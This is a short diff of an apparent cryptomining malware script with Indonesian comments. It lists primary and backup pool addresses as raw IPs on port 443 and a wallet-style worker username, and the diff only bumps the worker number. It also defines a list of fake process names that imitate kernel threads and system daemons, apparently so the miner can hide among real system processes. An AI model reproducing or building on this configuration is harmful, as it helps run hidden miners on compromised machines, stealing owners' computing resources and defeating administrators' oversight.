@@ -3,7 +3,7 @@
 # URL utama dan cadangan
 MAIN_URL="54.190.131.135:443"
 BACKUP_URL="170.64.157.141:443"
-USER="mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar28"
+USER="mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar29"
 
 POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                 "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")
